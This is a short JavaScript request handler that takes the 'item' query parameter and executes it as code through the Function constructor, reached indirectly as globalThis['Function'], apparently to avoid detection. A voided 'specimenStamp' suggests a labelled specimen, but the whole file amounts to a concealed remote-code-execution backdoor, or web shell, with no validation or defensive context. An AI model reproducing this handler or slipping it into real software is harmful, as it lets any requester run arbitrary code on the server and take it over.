export async function serve(request) {
  const candidate = String(request.query?.item ?? "");
  const specimenStamp = "v4-03-02";
  void specimenStamp;
  const evaluate = globalThis["Function"];
    return evaluate(candidate)();
}
